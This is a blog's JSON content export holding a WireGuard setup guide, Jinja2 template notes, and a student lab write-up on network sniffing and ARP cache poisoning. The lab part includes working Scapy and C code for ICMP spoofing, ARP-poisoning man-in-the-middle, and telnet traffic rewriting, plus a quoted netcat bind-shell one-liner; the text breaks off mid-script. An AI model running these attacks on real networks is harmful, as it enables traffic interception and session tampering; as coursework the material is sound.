{"meta":{"title":"Sayingの魔法书","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2021-06-04T03:07:41.197Z","updated":"2021-06-04T03:07:41.197Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2021-06-05T17:25:12.347Z","updated":"2021-06-05T17:25:12.347Z","comments":false,"path":"artitalk/index.html","permalink":"http://example.com/artitalk/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2021-06-04T03:03:13.389Z","updated":"2021-06-04T03:03:13.389Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2021-06-04T02:50:49.426Z","updated":"2021-06-04T02:50:49.426Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"下面写关于自己的内容"},{"title":"朋友们","date":"2021-06-12T11:54:12.773Z","updated":"2021-06-12T11:54:12.773Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":"","author":"saying"},{"title":"","date":"2021-06-04T03:04:01.024Z","updated":"2021-06-04T03:04:01.024Z","comments":true,"path":"mylist/index.html","permalink":"http://example.com/mylist/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2021-06-04T03:03:46.546Z","updated":"2021-06-04T03:03:46.546Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2021-06-12T16:52:11.632Z","updated":"2021-06-12T16:52:11.632Z","comments":true,"path":"google39cbf9a9df940ed0.html","permalink":"http://example.com/google39cbf9a9df940ed0.html","excerpt":"","text":"google-site-verification: google39cbf9a9df940ed0.html"}],"posts":[{"title":"wireguard基础配置","slug":"wireguard配置","date":"2021-09-06T12:50:44.000Z","updated":"2021-09-07T02:36:28.216Z","comments":true,"path":"2021/09/06/wireguard配置/","link":"","permalink":"http://example.com/2021/09/06/wireguard%E9%85%8D%E7%BD%AE/","excerpt":"","text":"本文配置的wireguard只是为了**（ 1.安装123add-apt-repository ppa:wireguard/wireguardapt updateapt install wireguard 2.创建配置文件(服务器)123456mkdir ~/.wireguardcd ~/.wireguard/wg genkey | tee pri1 | wg pubkey &gt;pub1 #生成服务器私钥、公钥wg genkey | tee pri2 | wg pubkey &gt;pub2 #生成客户端私钥、公钥chmod 600 pri1chmod 600 pri2 创建wg0.conf文件： 服务器配置文件`/etc/wireguard/wg0.conf` 123456789101112[Interface]PrivateKey = 服务器私钥Address = 10.0.0.1/24ListenPort = 54321PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ens17 -j MASQUERADEPostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o ens17 -j MASQUERADEDNS = 8.8.8.8MTU = 1420[Peer]PublicKey = 客户端公钥AllowedIPs = 10.0.0.2/24 还需要开启转发 12echo 1 &gt; /proc/sys/net/ipv4/ip_forwardecho &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.confsysctl -p 3.启动1wg-quick up wg0 事实上中间运行时出了点问题，需要安装resolvconf 1apt install openresolv 4.客户端配置1234567891011[Interface]PrivateKey = 客户端私钥Address = 10.0.0.2/24DNS = 8.8.8.8MTU = 1420[Peer]PublicKey = 服务器公钥AllowedIPs = 0.0.0.0/0Endpoint = 204.44.92.171:54321PersistentKeepalive = 25","categories":[],"tags":[{"name":"VPN","slug":"VPN","permalink":"http://example.com/tags/VPN/"}]},{"title":"flask_jinja2","slug":"flask-jinja2","date":"2021-06-12T07:48:03.000Z","updated":"2021-06-12T07:56:12.050Z","comments":true,"path":"2021/06/12/flask-jinja2/","link":"","permalink":"http://example.com/2021/06/12/flask-jinja2/","excerpt":"挺久之前氵的笔记","text":"挺久之前氵的笔记 0. jinja2 vs Django template 性能上 jinja2能够比Django的模版引擎快10到20倍 语法上 概括来说，可以总结为：Jinja的语法更接近于python的语法，Jinja模版中可以使用某些Python表达式的子集。 例如，拼接列表操作中，可以看出Jinja中过滤器更像是对象的方法的调用： Django： 12&#123;&#123; items|join:&quot;, &quot; &#125;&#125;## &#123;&#123;obj|filter_name:param&#125;&#125; Jinja： 12&#123;&#123; items|join(&#x27;, &#x27;) &#125;&#125;## &#123;&#123;obj|filter_name(param)&#125;&#125; 更多详细的不同可以参考官方文档中相关内容 1.简介Jinja模版与普通的html相比，包含两个特殊的部分： 标签：用于控制模版的逻辑 变量/表达式：用于在模版渲染时替换为值 Jinja中的默认分隔符如下： &#123;% ... %&#125; 用于语句（标签） &#123;&#123; ... &#125;&#125;用于打印表达式的输出 &#123;# ... #&#125;用于注释 # … ## 行语句，需要应用程序启用此功能，功能类似于&#123;% ... %&#125;，例如，以下两段示例完全等效： 1234567891011&lt;ul&gt;# for item in seq &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;# endfor&lt;/ul&gt;&lt;ul&gt;&#123;% for item in seq %&#125; &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;&#123;% endfor %&#125;&lt;/ul&gt; 关于行语句，由于功能完全类似于&#123;% ... %&#125;，可以忽略 2.基本语法2.1 变量除了普通的字符串变量，Jinja2还支持列表、字典和对象，你可以这样获取变量值： 12345678&#123;&#123; mydict[&#x27;key&#x27;] &#125;&#125;&#123;&#123; mylist[3] &#125;&#125;&#123;&#123; mylist[myintvar] &#125;&#125;&#123;&#123; myobj.somemethod() &#125;&#125;&#123;# 获取变量属性 #&#125;&#123;&#123; foo.bar &#125;&#125;&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125; 2.2 变量赋值12&#123;% set navigation = [(&#x27;index.html&#x27;, &#x27;Index&#x27;), (&#x27;about.html&#x27;, &#x27;About&#x27;)] %&#125;&#123;% set key, value = call_something() %&#125; 2.3 控制结构2.3.1 for使用方法: 123456&lt;h1&gt;Members&lt;/h1&gt;&lt;ul&gt;&#123;% for user in users %&#125; &lt;li&gt;&#123;&#123; user.username|e &#125;&#125;&lt;/li&gt;&#123;% endfor %&#125;&lt;/ul&gt; 循环语句中字典可能无序，可使用dictsort过滤器 相比于Python中的for循环，使用Jinja时，在for循环的循环体中可以使用一些特殊的变量： 2.3.2 ifif的使用十分类似于Python中的if。 1234567&#123;% if kenny.sick %&#125; Kenny is sick.&#123;% elif kenny.dead %&#125; You killed Kenny! You bastard!!!&#123;% else %&#125; Kenny looks okay --- so far&#123;% endif %&#125; 2.4 宏Jinja中的宏（macro）类似于常规编程语言中的宏。宏的存在是为了替换简单的多次重复的代码。 例如，可以首先定义一个宏： 1234&#123;% macro input(name, value=&#x27;&#x27;, type=&#x27;text&#x27;, size=20) -%&#125; &lt;input type=&quot;&#123;&#123; type &#125;&#125;&quot; name=&quot;&#123;&#123; name &#125;&#125;&quot; value=&quot;&#123;&#123; value|e &#125;&#125;&quot; size=&quot;&#123;&#123; size &#125;&#125;&quot;&gt;&#123;%- endmacro %&#125; 然后可以像命名空间中的函数一样调用该宏： 12&lt;p&gt;&#123;&#123; input(&#x27;username&#x27;) &#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123; input(&#x27;password&#x27;, type=&#x27;password&#x27;) &#125;&#125;&lt;/p&gt; *如果宏是在其他模板中定义的，则必须首先将其[导入](#2.7 import)*。 2.5 块——模板继承块的作用主要体现在模板继承。 在父模版中： 123456789101112131415161718&#123;# base.html #&#125;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &#123;% block head %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; /&gt; &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125; - My Webpage&lt;/title&gt; &#123;% endblock %&#125;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;content&quot;&gt;&#123;% block content %&#125;&#123;% endblock %&#125;&lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &#123;% block footer %&#125; &amp;copy; Copyright 2008 by &lt;a href=&quot;http://domain.invalid/&quot;&gt;you&lt;/a&gt;. &#123;% endblock %&#125; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 子模版中： 1234567891011121314&#123;% extends &#x27;base.html&#x27; %&#125;&#123;% block title %&#125;Index&#123;% endblock %&#125;&#123;% block head %&#125; &#123;&#123; super() &#125;&#125; &lt;style type=&quot;text/css&quot;&gt; .important &#123; color: #336699; &#125; &lt;/style&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;h1&gt;Index&lt;/h1&gt; &lt;p class=&quot;important&quot;&gt; Welcome to my awesome homepage. &lt;/p&gt;&#123;% endblock %&#125; 在子模板的开头定义了&#123;% extend 'base.html' %&#125;语句来声明继承，此后在子模板中由&#123;% block block_name %&#125;`和`&#123;% endblock %&#125;所包括的语句块，将会替换父模板中同样由&#123;% block block_name %&#125;`和`&#123;% endblock %&#125;所包括的部分。 模板不支持多继承，也就是子模板中定义的块，不可能同时被两个父模板替换。 模板中不能定义多个同名的块，子模板和父模板都不行，因为这样无法知道要替换哪一个部分的内容。 建议在endblock关键字后也加上块名，比如&#123;% endblock block_name %&#125;。可提高程序可读性。 若不希望父模板中的块被子模板替换，可在子模版的块中使用&#123;&#123; super() &#125;&#125;。 默认情况下，块内语句是无法访问块外作用域中的变量。如果想在块内访问块外的变量，需要在块声明时添加scoped关键字：&#123;% block block_name scoped %&#125;&#123;% endblock %&#125; 2.6 includeinclude用于实现代码重用的功能。通过&#123;% include %&#125;语句，可以将另一个模板加载到当前模板中，并直接渲染在当前位置上。 123&#123;% include &#x27;header.html&#x27; %&#125; Body&#123;% include &#x27;footer.html&#x27; %&#125; 当”include”的模板文件不存在时，程序会抛出异常。可以加上”ignore missing”关键字，这样如果模板不存在，就会忽略这段&#123;% include %&#125;语句。 1&#123;% include &#x27;footer.html&#x27; ignore missing %&#125; &#123;% include %&#125;语句还可以跟一个模板列表： 1&#123;% include [&#x27;footer.html&#x27;,&#x27;bottom.html&#x27;,&#x27;end.html&#x27;] ignore missing %&#125; 上例中，程序会按顺序寻找模板文件，第一个被找到的模板即被加载，而其后的模板都会被忽略。如果都没找到，那整个语句都会被忽略。 2.7 import一个模版中定义的[宏(macro)](#2.4 宏)可以被不同的模板使用，因此可以将其声明在一个单独的模板文件中。需要使用时import进行导入。 import的语法类似于python中的import 1234&#123;% import &#x27;form.html&#x27; as form %&#125;&lt;p&gt;&#123;&#123; form.input(&#x27;username&#x27;, value=&#x27;user&#x27;) &#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123; form.input(&#x27;password&#x27;, &#x27;password&#x27;) &#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123; form.input(&#x27;submit&#x27;, &#x27;submit&#x27;, &#x27;Submit&#x27;) &#125;&#125;&lt;/p&gt; 或 1234&#123;% from &#x27;form.html&#x27; import input %&#125;&lt;p&gt;&#123;&#123; input(&#x27;username&#x27;, value=&#x27;user&#x27;) &#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123; input(&#x27;password&#x27;, &#x27;password&#x27;) &#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123; input(&#x27;submit&#x27;, &#x27;submit&#x27;, &#x27;Submit&#x27;) &#125;&#125;&lt;/p&gt; 3. 上下文在Flask应用中的模板可以使用到请求上下文中的环境变量，及一些辅助函数。 例如： 1&#123;&#123; request.url &#125;&#125; 上下文变量和函数都可以自定义： 12345from flask import current_app@app.context_processordef appinfo(): return dict(appname=current_app.name) 函数用@app.context_processor装饰器修饰，它是一个上下文处理器，它的作用是在模板被渲染前运行其所修饰的函数，并将函数返回的字典导入到模板上下文环境中，与模板上下文合并。 自定义函数方法如下： 1234567import time@app.context_processordef get_current_time(): def get_time(timeFormat=&quot;%b %d, %Y - %H:%M:%S&quot;): return time.strftime(timeFormat) return dict(current_time=get_time) 12&lt;p&gt;Current Time is: &#123;&#123; current_time() &#125;&#125;&lt;/p&gt;&lt;p&gt;Current Day is: &#123;&#123; current_time(&quot;%Y-%m-%d&quot;) &#125;&#125;&lt;/p&gt; 4. 过滤器变量可以通过过滤器被修改。过滤器可以被认为是一种转换函数，使用过滤器利用的是管道符|。输入的参数就是其所修饰的变量，一些可选参数可以包含在括号中，返回的就是变量转换后的值。过滤器的使用举例如下： 123&#123;&#123; &quot;&lt;p&gt;test&lt;/p&gt;&quot;|striptags|upper &#125;&#125;&#123;# striptags:去除标签，返回&quot;test&quot; #&#125;&#123;# upper:大写，返回&quot;TEST&quot; #&#125; 1&#123;&#123; listx|join(&#x27;, &#x27;) &#125;&#125; Jinja内置的过滤器如下图所示 这些过滤器具体的作用可以参考官方文档 同时，还可以使用自定义的过滤器。自定义过滤器可以通过两种方式实现： 1234567891011121314151617# 方式一，通过app.add_template_filter方法def list_reverse(li): temp = list(li) temp.reverse() return temp# 第一个参数指定过滤器函数，第二个（可选）参数表示过滤器的名字，默认为函数名app.add_template_filter(list_reverse,&#x27;li_reverse&#x27;)# 方式二，通过装饰器# filter_name参数可选，默认为函数名@app.template_filter(filter_name)def my_filter(args): temp = list(args) temp.reverse() return temp 随后可以使用自定义的过滤器 1&#123;&#123; listx|list_reverse &#125;&#125;","categories":[{"name":"flask","slug":"flask","permalink":"http://example.com/categories/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://example.com/tags/flask/"},{"name":"jinja2","slug":"jinja2","permalink":"http://example.com/tags/jinja2/"}]},{"title":"网络攻防实践(二)第7、8次实验","slug":"网络攻防实践-二-第7、8次实验","date":"2021-06-06T05:03:23.000Z","updated":"2021-06-22T14:25:07.058Z","comments":true,"path":"2021/06/06/网络攻防实践-二-第7、8次实验/","link":"","permalink":"http://example.com/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5-%E4%BA%8C-%E7%AC%AC7%E3%80%818%E6%AC%A1%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"网络攻防实践(二)第7、8次实验攻防实践毁我青春 经历了前几次极其无聊的攻防实践尤其是垃圾渗透测试，终于到了这次算是我较为感兴趣的攻防实践——嗅探与伪造/ARP缓存中毒。碰巧这几天重构了自己的博客，顺手写进博客 一、嗅探与伪造1.1 scapy路由追踪目的是scapy实现路由追踪。实际上，有关路由追踪的常见方式有两种： linux/BSD/router/UNIX下的traceroute。向目的地址的某个端口（大于30000）发送UDP数据报。 windows下的tracert。向目的地址发送icmp回显请求数据报。 当然本质上都是设置ttl=1发包，然后逐次增加ttl。通过接受到的icmp超时报文，获取路径上节点的ip地址。 指导书要求使用icmp回显请求数据报。 123456789101112131415161718192021222324252627282930import argparsefrom scapy.all import *# MAX_TTL = 64MAX_TTL = 32def ping_once(dst, ttl): pkt = IP(dst=dst, ttl=ttl) / ICMP(type=8) trace_reply = sr1(pkt, retry = 1, timeout = 7) if trace_reply is None: return &quot;请求超时&quot; return trace_reply[&#x27;IP&#x27;].srcdef tracert(dst): res = &#x27;&#x27; for ttl in range(1, MAX_TTL + 1): src = ping_once(dst, ttl) ans = &quot;&#123;&#125;: &#123;:^20&#125;&quot;.format(ttl, src) print(ans) res += ans + &#x27;\\n&#x27; if src == dst: break return resif __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&quot;traceroute&quot;) parser.add_argument(&quot;dst&quot;, help=&quot;destination ip&quot;) args = parser.parse_args() print(tracert(args.dst)) 可能有某些节点禁ping，或者是什么其他安全措施，导致请求超时，这是正常的。即使使用Windows自带的tracert也会出现这种情况 1.2 伪造icmp响应报文目的是对嗅探的任意icmp请求报文做出回应，即使目标不是自己。这样，如果网络正常，目标主机在ping命令时，每发出一个icmp echo request，将收到两个icmp echo reply。 直接上代码吧（ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#include &lt;pcap.h&gt; #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &quot;myheader.h&quot;void reply_icmp_pkt(struct ipheader *ip, struct icmpheader *icmp);unsigned short in_cksum(unsigned short *buf,int length);void send_raw_ip_packet(struct ipheader* ip);void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) &#123; struct ethheader *eth=(struct ethheader *)packet; if(ntohs(eth-&gt;ether_type) == 0x800) &#123; struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader)); if (ip-&gt;iph_protocol == IPPROTO_ICMP) &#123; printf(&quot;Got an ICMP packet\\n&quot;); printf(&quot; From: %s\\n&quot;,inet_ntoa(ip-&gt;iph_sourceip)); printf(&quot; To: %s\\n&quot;,inet_ntoa(ip-&gt;iph_destip)); struct icmpheader *icmp = (struct icmpheader *)(packet + sizeof(struct ethheader) + sizeof(struct ipheader)); if (icmp-&gt;icmp_type == 8) &#123; reply_icmp_pkt(ip, icmp); &#125; &#125; &#125;&#125;int main()&#123; pcap_t *handle; char errbuf[PCAP_ERRBUF_SIZE]; struct bpf_program fp; char filter_exp[] = &quot;ip proto icmp&quot;; bpf_u_int32 net; // Step 1: Open live pcap session on NIC with interface name handle = pcap_open_live(&quot;docker0&quot;, BUFSIZ, 1, 1000, errbuf); // Step 2: Compile filter_exp into BPF psuedo-code pcap_compile(handle, &amp;fp, filter_exp, 0, net); pcap_setfilter(handle, &amp;fp); // Step 3: Capture packets pcap_loop(handle, -1, got_packet, NULL); pcap_close(handle); //Close the handle return 0;&#125;void reply_icmp_pkt(struct ipheader *ip, struct icmpheader *icmp) &#123; char buffer[PACKET_LEN]; memset(buffer, 0, PACKET_LEN); struct icmpheader *reply_icmp; reply_icmp = (struct icmpheader *)(buffer + sizeof(struct ipheader)); struct ipheader *reply_ip; reply_ip = (struct ipheader *) buffer; int icmp_len = ntohs(ip-&gt;iph_len) - sizeof(struct ipheader); memcpy(reply_icmp, icmp, icmp_len); reply_icmp-&gt;icmp_type = 0; reply_icmp-&gt;icmp_chksum = 0; void *temp = reply_icmp; reply_icmp-&gt;icmp_chksum = in_cksum(temp, icmp_len); reply_ip-&gt;iph_ver = 4; reply_ip-&gt;iph_ihl = 5; reply_ip-&gt;iph_tos = 16; reply_ip-&gt;iph_ident = htons(54321); reply_ip-&gt;iph_ttl = 64; reply_ip-&gt;iph_sourceip.s_addr = ip-&gt;iph_destip.s_addr; reply_ip-&gt;iph_destip.s_addr = ip-&gt;iph_sourceip.s_addr; reply_ip-&gt;iph_protocol = IPPROTO_ICMP; // The value is 1, representing ICMP. reply_ip-&gt;iph_len = htons(sizeof(struct ipheader) + icmp_len); send_raw_ip_packet(reply_ip); return;&#125;unsigned short in_cksum(unsigned short *buf,int length)&#123; unsigned short *w = buf; int nleft = length; int sum = 0; unsigned short temp=0; /* * The algorithm uses a 32 bit accumulator (sum), adds * sequential 16 bit words to it, and at the end, folds back all the * carry bits from the top 16 bits into the lower 16 bits. */ while (nleft &gt; 1) &#123; sum += *w++; nleft -= 2; &#125; /* treat the odd byte at the end, if any */ if (nleft == 1) &#123; *(u_char *)(&amp;temp) = *(u_char *)w ; sum += temp; &#125; /* add back carry outs from top 16 bits to low 16 bits */ sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff); // add hi 16 to low 16 sum += (sum &gt;&gt; 16); // add carry return (unsigned short)(~sum);&#125;/******************************************************************************* Given an IP packet, send it out using raw socket. *******************************************************************************/void send_raw_ip_packet(struct ipheader* ip)&#123; struct sockaddr_in dest_info; int enable = 1; // Create a raw network socket, and set its options. int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &amp;enable, sizeof(enable)); // Provide needed information about destination. dest_info.sin_family = AF_INET; dest_info.sin_addr = ip-&gt;iph_destip; // Send the packet out. printf(&quot;Sending spoofed IP packet...\\n&quot;); if(sendto(sock,ip,ntohs(ip-&gt;iph_len),0,(struct sockaddr *)&amp;dest_info,sizeof(dest_info)) &lt; 0) &#123; perror(&quot;PACKET NOT SENT\\n&quot;); return; &#125; else &#123; printf(&quot;\\n---------------------------------------------------\\n&quot;); printf(&quot; From: %s\\n&quot;,inet_ntoa(ip-&gt;iph_sourceip)); printf(&quot; To: %s\\n&quot;,inet_ntoa(ip-&gt;iph_destip)); printf(&quot;\\n---------------------------------------------------\\n&quot;); &#125; close(sock);&#125; 需要头文件： 头文件myheader.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596/* ethernet headers are always exactly 14 bytes [1] */#define SIZE_ETHERNET 14/* Ethernet addresses are 6 bytes */#define ETHER_ADDR_LEN 6#define PACKET_LEN 1500/* Ethernet header */struct ethheader &#123; u_char ether_dhost[ETHER_ADDR_LEN]; /* destination host address */ u_char ether_shost[ETHER_ADDR_LEN]; /* source host address */ u_short ether_type; /* IP? ARP? RARP? etc */&#125;;/* IP Header */struct ipheader &#123; unsigned char iph_ihl:4, iph_ver:4; //IP Header length &amp; Version. unsigned char iph_tos; //Type of service unsigned short int iph_len; //IP Packet length (Both data and header) unsigned short int iph_ident; //Identification unsigned short int iph_flag:3, iph_offset:13; //Flags and Fragmentation offset unsigned char iph_ttl; //Time to Live unsigned char iph_protocol; //Type of the upper-level protocol unsigned short int iph_chksum; //IP datagram checksum struct in_addr iph_sourceip; //IP Source address (In network byte order) struct in_addr iph_destip;//IP Destination address (In network byte order)&#125;;/* ICMP Header */struct icmpheader &#123; unsigned char icmp_type; //ICMP message type unsigned char icmp_code; //Error code unsigned short int icmp_chksum; //Checksum for ICMP Header and data unsigned short int icmp_id; //Used in echo request/reply to identify request unsigned short int icmp_seq;//Identifies the sequence of echo messages, //if more than one is sent.&#125;;/* TCP Header */struct tcpheader &#123; u_short tcp_sport; /* source port */ u_short tcp_dport; /* destination port */ u_int tcp_seq; /* sequence number */ u_int tcp_ack; /* acknowledgement number */ u_char tcp_offx2; /* data offset, rsvd */#define TH_OFF(th) (((th)-&gt;tcp_offx2 &amp; 0xf0) &gt;&gt; 4) u_char tcp_flags;#define TH_FIN 0x01#define TH_SYN 0x02#define TH_RST 0x04#define TH_PUSH 0x08#define TH_ACK 0x10#define TH_URG 0x20#define TH_ECE 0x40#define TH_CWR 0x80#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR) u_short tcp_win; /* window */ u_short tcp_sum; /* checksum */ u_short tcp_urp; /* urgent pointer */&#125;;/* UDP Header */struct udpheader&#123; u_int16_t udp_sport; /* source port */ u_int16_t udp_dport; /* destination port */ u_int16_t udp_ulen; /* udp length */ u_int16_t udp_sum; /* udp checksum */&#125;;struct pseudo_tcp&#123; unsigned saddr, daddr; unsigned char mbz; unsigned char ptcl; unsigned short tcpl; struct tcpheader tcp; char payload[PACKET_LEN];&#125;;// DNS layer header&#x27;s structurestruct dnsheader &#123; unsigned short int query_id; unsigned short int flags; unsigned short int QDCOUNT; unsigned short int ANCOUNT; unsigned short int NSCOUNT; unsigned short int ARCOUNT;&#125;; 二、ARP缓存中毒写到心态爆炸 2.1 略2.2 中间人攻击作为中间人持续给A和B发送ARP请求数据包。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/python3from scapy.all import *from time import *# Machine A&#x27;s informatonIP_A = &quot;192.168.60.2&quot;MAC_A = &quot;02:42:c0:a8:3c:02&quot;# Machine B&#x27;s informatonIP_B = &quot;192.168.60.1&quot;MAC_B = &quot;02:42:f3:a7:10:f7&quot;# Attacker Machine&#x27;s informatonIP_M = &quot;192.168.60.3&quot;MAC_M = &quot;02:42:c0:a8:3c:03&quot;print(&quot;SENDING SPOOFED ARP REPLY.........&quot;)# Construct spoofed ARP sent to machine Aether1 = Ether()ether1.dst = MAC_Aarp1 = ARP()arp1.psrc = IP_Barp1.hwsrc = MAC_Marp1.pdst = IP_Aarp1.op = 1 frame1 = ether1/arp1# Construct spoofed ARP sent to machine Bether2 = Ether()ether2.dst = MAC_Barp2 = ARP()arp2.psrc = IP_Aarp2.hwsrc = MAC_Marp2.pdst = IP_Barp2.op = 1 frame2 = ether2/arp2while 1: sendp(frame1) sendp(frame2) sleep(5) 2.3 修改telnet响应报文折磨我了几个小时，怎么改脚本都有问题。最后参考了ssj dl写的脚本，感觉也没啥太大不一样的。然后发现…….. {note, info red, 垃圾seedUbuntu虚拟机，重新启动之后会docker2网卡的MAC地址会发生变化，导致脚本出大问题！！！！} 最终的脚本如下： 修改telnet响应报文： 12345678910111213141516171819202122232425262728293031323334353637383940414243import refrom scapy.all import *# Machine A&#x27;s informatonIP_A = &quot;192.168.60.2&quot;MAC_A = &quot;02:42:c0:a8:3c:02&quot;# Machine B&#x27;s informaton# treat Gateway as Machine BIP_B = &quot;192.168.60.1&quot;MAC_B = &quot;02:42:25:83:40:3f&quot;# Server2&#x27;s informationIP_Server2 = &quot;10.0.2.7&quot;MAC_Server2 = &quot;02:42:0a:00:02:07&quot;# Attacker Machine&#x27;s informatonIP_M = &quot;192.168.60.3&quot;MAC_M = &quot;02:42:c0:a8:3c:03&quot;def spoof_pkt(pkt): if pkt.haslayer(IP): if pkt[IP].src == IP_A and pkt[IP].dst == IP_Server2: pkt.src = MAC_M pkt.dst = MAC_B del pkt[IP].chksum del pkt[TCP].chksum sendp(pkt) elif pkt[IP].src == IP_Server2 and pkt[IP].dst == IP_A: pkt.src = MAC_M pkt.dst = MAC_A del pkt[IP].chksum del pkt[TCP].chksum data = pkt[TCP].payload.load newdata = re.sub(r&#x27;[0-9a-zA-Z]&#x27;, r&#x27;Z&#x27;, data.decode()) newdata = newdata.encode() print(&quot;\\tdata:&#123;&#125;\\n\\tnewdata:&#123;&#125;&quot;.format(data.decode(), newdata.decode())) newpkt = pkt del(newpkt[TCP].payload) sendp(newpkt/newdata)f = &#x27;tcp and (ether src &#123;&#125; or ether src &#123;&#125;)&#x27;.format(MAC_A, MAC_B)pkt = sniff(filter=f, prn=spoof_pkt) 贴一张截图： 如果修改请求报文 实际上也可以修改请求报文。只不过，修改请求报文的结果是：输入任何都会回显Z，因为实际的输入被改为了Z，回车就会看到command not found。12345678910111213141516171819202122232425262728293031323334353637383940414243444546import refrom scapy.all import *# Machine A&#x27;s informatonIP_A = &quot;192.168.60.2&quot;MAC_A = &quot;02:42:c0:a8:3c:02&quot;# Machine B&#x27;s informaton# treat Gateway as Machine BIP_B = &quot;192.168.60.1&quot;MAC_B = &quot;02:42:25:83:40:3f&quot;# Server2&#x27;s informationIP_Server2 = &quot;10.0.2.7&quot;MAC_Server2 = &quot;02:42:0a:00:02:07&quot;# Attacker Machine&#x27;s informatonIP_M = &quot;192.168.60.3&quot;MAC_M = &quot;02:42:c0:a8:3c:03&quot;def spoof_pkt(pkt): if pkt.haslayer(IP): if pkt[IP].src == IP_A and pkt[IP].dst == IP_Server2: pkt.src = MAC_M pkt.dst = MAC_B del pkt[IP].chksum del pkt[TCP].chksum if pkt.haslayer(TCP) and pkt[TCP].payload: data = pkt[TCP].payload.load newdata = re.sub(r&#x27;[0-9a-zA-Z]&#x27;, r&#x27;Z&#x27;, data.decode()) newdata = newdata.encode() print(&quot;\\tdata:&#123;&#125;\\n\\tnewdata:&#123;&#125;&quot;.format(data.decode(), newdata.decode())) newpkt = pkt del(newpkt[TCP].payload) sendp(newpkt/newdata) else: sendp(pkt) elif pkt[IP].src == IP_Server2 and pkt[IP].dst == IP_A: pkt.src = MAC_M pkt.dst = MAC_A del pkt[IP].chksum del pkt[TCP].chksum sendp(pkt)f = &#x27;tcp and (ether src &#123;&#125; or ether src &#123;&#125;)&#x27;.format(MAC_A, MAC_B)pkt = sniff(filter=f, prn=spoof_pkt) 2.4 修改netcat报文先copy一下nc手册的关于远程命令执行的一段话： 1234567891011121314151617181920There is no -c or -e option in this netcat, but you still can execute acommand after connection being established by redirecting file descrip-tors. Be cautious here because opening a port and let anyone connectedexecute arbitrary command on your site is DANGEROUS. If you really needto do this, here is an example:On &#x27;server&#x27; side: $ rm -f /tmp/f; mkfifo /tmp/f $ cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 1234 &gt; /tmp/fOn &#x27;client&#x27; side: $ nc host.example.com 1234 $ (shell prompt from host.example.com)By doing this, you create a fifo at /tmp/f and make nc listen at port1234 of address 127.0.0.1 on &#x27;server&#x27; side, when a &#x27;client&#x27; establishes aconnection successfully to that port, /bin/sh gets executed on &#x27;server&#x27;side and the shell prompt is given to &#x27;client&#x27; side. 按照手册运行nc。 nc脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import refrom scapy.all import *# Machine A&#x27;s informatonIP_A = &quot;192.168.60.2&quot;MAC_A = &quot;02:42:c0:a8:3c:02&quot;# Machine B&#x27;s informaton# treat Gateway as Machine BIP_B = &quot;192.168.60.1&quot;MAC_B = &quot;02:42:25:83:40:3f&quot;# Server2&#x27;s informationIP_Server2 = &quot;10.0.2.7&quot;MAC_Server2 = &quot;02:42:0a:00:02:07&quot;# Attacker Machine&#x27;s informatonIP_M = &quot;192.168.60.3&quot;MAC_M = &quot;02:42:c0:a8:3c:03&quot;def spoof_pkt(pkt): if pkt.haslayer(IP): if pkt[IP].src == IP_A and pkt[IP].dst == IP_Server2: pkt.src = MAC_M pkt.dst = MAC_B del pkt[IP].chksum del pkt[TCP].chksum if pkt.haslayer(TCP) and pkt[TCP].payload: data = pkt[TCP].payload.load newdata = &#x27;U2019xxxxx_name\\x0a&#x27; newdata = 